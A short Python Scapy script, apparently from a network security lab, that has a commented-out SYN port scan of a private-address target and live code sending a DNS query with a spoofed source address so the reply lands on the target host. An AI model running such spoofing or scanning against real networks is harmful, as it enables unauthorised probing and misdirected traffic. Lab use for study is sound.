from scapy.all import *

target_ip   ="10.1.0.3"
dns_ip      ="10.12.0.20"

#Scan the target for open ports
#res, unans = sr( IP(dst=target_ip)/TCP(flags="S", dport=(5350,6000)))
#res.summary(lambda s,r: r.sprintf("%TCP.sport% \t %TCP.flags%"))
#res.nsummary(lfilter = lambda s,r: r.sprintf("%TCP.flags%") == "SA")
#Send a DNS request in the name of WS2 so that WS2 gets a DNS response in port 5353
ip      = IP(src= target_ip, dst= dns_ip)
udp     = UDP(dport=5353)
dns     = DNS(rd=1,qd=DNSQR(qname="example.com"))
packet  = ip/udp/dns
send(packet)
